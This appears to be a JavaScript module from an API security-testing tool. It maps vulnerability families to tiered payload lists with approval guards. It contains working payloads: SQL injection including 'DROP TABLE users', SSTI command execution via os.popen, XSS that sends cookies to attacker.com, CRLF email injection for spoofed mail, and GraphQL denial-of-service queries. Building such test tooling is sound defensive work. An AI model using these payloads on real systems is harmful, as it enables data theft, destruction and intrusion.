const FAMILY_PAYLOAD_PACKS = {
  'auth-bypass': {
    safe: [
      { location: 'header', key: 'Authorization', value: 'Bearer undefined' },
      { location: 'header', key: 'X-Forwarded-For', value: '127.0.0.1' }
    ],
    controlled_mutation: [
      { location: 'body', key: 'otp', value: '000000' },
      { location: 'body', key: 'verificationCode', value: '111111' }
    ],
    high_risk: [
      { location: 'body', key: 'password', value: 'P@ssw0rd!temp' }
    ],
    execution_guards: [
      'Always run safe probes first and compare unauthorized responses.',
      'Require explicit confirmation before OTP, reset, or credential-changing flows.',
      'Block high-risk payloads when target host is not localhost or staging.'
    ]
  },
  'sql-injection': {
    safe: [
      { location: 'query', key: 'q', value: "' OR 1=1 --" },
      { location: 'query', key: 'filter', value: "' AND 1=2 --" }
    ],
    controlled_mutation: [
      { location: 'query', key: 'id', value: "' AND SLEEP(5) --" }
    ],
    high_risk: [
      { location: 'query', key: 'id', value: "'; DROP TABLE users; --" }
    ],
    execution_guards: [
      'Do not execute destructive payloads against non-disposable environments.',
      'Use timing payloads only after safe error-based probes.',
      'Require user approval before controlled-mutation or high-risk payload tiers.'
    ]
  },
  'nosql-injection': {
    safe: [
      { location: 'body', key: 'username', value: '{"$gt":""}' },
      { location: 'body', key: 'password', value: '{"$gt":""}' }
    ],
    controlled_mutation: [
      { location: 'body', key: '$where', value: 'this.role=="admin"' }
    ],
    high_risk: [
      { location: 'body', key: '$function', value: 'return true;' }
    ],
    execution_guards: [
      'Prefer schema-safe malformed JSON probes before operator payloads.',
      'Require approval before adding executable operators or script-like keys.'
    ]
  },
  'bola-idor': {
    safe: [
      { location: 'query', key: 'id', value: '0' },
      { location: 'query', key: 'id', value: '99999' }
    ],
    controlled_mutation: [
      { location: 'path', key: 'id', value: '-1' }
    ],
    high_risk: [
      { location: 'query', key: 'id', value: '1&role=admin' }
    ],
    execution_guards: [
      'Use read-only methods for identifier manipulation first.',
      'Block DELETE/PUT/PATCH IDOR probes unless user confirms mutation.'
    ]
  },
  'xss': {
    safe: [
      { location: 'query', key: 'q', value: '<script>alert(1)</script>' },
      { location: 'query', key: 'search', value: '"><img src=x onerror=alert(1)>' },
      { location: 'body', key: 'comment', value: '<svg onload=alert(1)>' }
    ],
    controlled_mutation: [
      { location: 'body', key: 'name', value: '<img src=x onerror=fetch("http://attacker.com?c="+document.cookie)>' },
      { location: 'query', key: 'redirect', value: 'javascript:alert(1)' }
    ],
    high_risk: [
      { location: 'body', key: 'bio', value: '<script>document.location="http://attacker.com/"+document.cookie</script>' },
      { location: 'body', key: 'message', value: '<iframe src="http://attacker.com/phishing"></iframe>' }
    ],
    execution_guards: [
      'XSS payloads are safe when reflected immediately in response.',
      'Do not submit persistent XSS payloads to shared or production environments.',
      'Require disposable accounts for DOM-based XSS testing.'
    ]
  },
  'ssti': {
    safe: [
      { location: 'query', key: 'template', value: '{{7*7}}' },
      { location: 'body', key: 'greeting', value: 'Hello {{7*7}}' },
      { location: 'query', key: 'name', value: '${7*7}' }
    ],
    controlled_mutation: [
      { location: 'body', key: 'template', value: '{{config}}' },
      { location: 'query', key: 'view', value: '<%= 7*7 %>' }
    ],
    high_risk: [
      { location: 'body', key: 'template', value: '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}' },
      { location: 'body', key: 'expression', value: '<%= `id` %>' }
    ],
    execution_guards: [
      'SSTI detection with arithmetic expressions is safe.',
      'Do not execute command-injection SSTI payloads on non-disposable targets.',
      'Require explicit approval before testing config or environment variable access.'
    ]
  },
  'graphql-injection': {
    safe: [
      { location: 'body', key: 'query', value: '{"query": "{__typename}"}' },
      { location: 'body', key: 'query', value: '{"query": "{__schema{types{name}}}"}' },
      { location: 'body', key: 'query', value: '{"query": "{user{id}}", "variables": {"id": "1"}}' }
    ],
    controlled_mutation: [
      { location: 'body', key: 'query', value: '{"query": "{user{id email password}}"}' },
      { location: 'body', key: 'query', value: '{"query": "{__schema{directives{name}}}", "operationName": "IntrospectionQuery"}' }
    ],
    high_risk: [
      { location: 'body', key: 'query', value: '{"query": "{a:User{id} b:User{id} c:User{id} d:User{id} e:User{id} f:User{id} g:User{id} h:User{id} i:User{id} j:User{id}}"}' },
      { location: 'body', key: 'query', value: '{"query": "query { user { friends { friends { friends { friends { friends { id } } } } } } }"}' }
    ],
    execution_guards: [
      'Introspection queries are safe and reveal schema information.',
      'Deeply nested queries may cause DoS - use only on disposable targets.',
      'Batch query abuse testing requires rate limit monitoring.'
    ]
  },
  'ldap-injection': {
    safe: [
      { location: 'query', key: 'user', value: '*)(uid=*))(|(uid=*' },
      { location: 'body', key: 'username', value: 'admin*' },
      { location: 'query', key: 'filter', value: '(|(uid=*))' }
    ],
    controlled_mutation: [
      { location: 'body', key: 'username', value: 'admin)(|(password=*)' },
      { location: 'query', key: 'search', value: '*%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A' }
    ],
    high_risk: [
      { location: 'body', key: 'username', value: 'admin)(!(password=*))' },
      { location: 'query', key: 'filter', value: '*)(uid=*))(|(uid=*)(password=*)' }
    ],
    execution_guards: [
      'LDAP injection probes are safe when using wildcard patterns.',
      'Do not test negation-based payloads on production LDAP servers.',
      'Require approval before testing authentication bypass patterns.'
    ]
  },
  'xpath-injection': {
    safe: [
      { location: 'query', key: 'id', value: "' or '1'='1" },
      { location: 'body', key: 'user', value: 'ancestor-or-self::*' },
      { location: 'query', key: 'search', value: '//user' }
    ],
    controlled_mutation: [
      { location: 'body', key: 'filter', value: "' or 1=1 or ''='" },
      { location: 'query', key: 'node', value: '../../..' }
    ],
    high_risk: [
      { location: 'body', key: 'query', value: "' or '1'='1' or ''='" },
      { location: 'query', key: 'path', value: "//user[password[contains(.,'a')]]" }
    ],
    execution_guards: [
      'XPath probes with simple predicates are safe.',
      'Do not execute data-extraction XPath payloads on production XML stores.',
      'Require disposable targets for node traversal testing.'
    ]
  },
  'prototype-pollution': {
    safe: [
      { location: 'body', key: '__proto__', value: '{"test":"polluted"}' },
      { location: 'body', key: 'constructor', value: '{"prototype":{"isAdmin":true}}' },
      { location: 'body', key: 'proto', value: '{"isAdmin":true}' }
    ],
    controlled_mutation: [
      { location: 'body', key: '__proto__.isAdmin', value: 'true' },
      { location: 'body', key: 'constructor.prototype.role', value: '"admin"' }
    ],
    high_risk: [
      { location: 'body', key: '__proto__.exec', value: 'function() { return "pwned"; }' },
      { location: 'body', key: 'constructor.prototype.isAdmin', value: 'true' }
    ],
    execution_guards: [
      'Prototype pollution probes are safe when using test keys.',
      'Do not pollute prototypes on shared environments - may affect other users.',
      'Require isolated testing for privilege escalation via prototype chain.'
    ]
  },
  'email-header-injection': {
    safe: [
      { location: 'body', key: 'email', value: 'test@example.com' },
      { location: 'body', key: 'to', value: 'user@test.com' },
      { location: 'query', key: 'notify', value: 'test%40example.com' }
    ],
    controlled_mutation: [
      { location: 'body', key: 'email', value: 'test@example.com%0aCc:victim@example.com' },
      { location: 'body', key: 'to', value: 'user@test.com%0dBcc:attacker@example.com' }
    ],
    high_risk: [
      { location: 'body', key: 'email', value: 'test@example.com%0d%0aSubject:Spam%0d%0aFrom:admin@target.com%0d%0a%0d%0aMalicious%20content' },
      { location: 'body', key: 'to', value: 'user@test.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>Phishing</html>' }
    ],
    execution_guards: [
      'Email format validation probes are safe.',
      'Do not send actual emails via notification endpoints on production systems.',
      'Require disposable email addresses and explicit approval for CRLF injection tests.'
    ]
  }
};

const DEFAULT_PACK = {
  safe: [
    { location: 'query', key: 'id', value: '0' }
  ],
  controlled_mutation: [],
  high_risk: [],
  execution_guards: [
    'Default to non-destructive probes first.',
    'Require explicit confirmation before mutating methods.'
  ]
};

function clonePack(pack) {
  return {
    safe: Array.isArray(pack.safe) ? pack.safe.slice(0, 8) : [],
    controlled_mutation: Array.isArray(pack.controlled_mutation) ? pack.controlled_mutation.slice(0, 6) : [],
    high_risk: Array.isArray(pack.high_risk) ? pack.high_risk.slice(0, 4) : [],
    execution_guards: Array.isArray(pack.execution_guards) ? pack.execution_guards.slice(0, 8) : []
  };
}

function resolvePayloadPackForFamily(familyId) {
  const key = typeof familyId === 'string' ? familyId.trim() : '';
  return clonePack(FAMILY_PAYLOAD_PACKS[key] || DEFAULT_PACK);
}

module.exports = {
  resolvePayloadPackForFamily
};
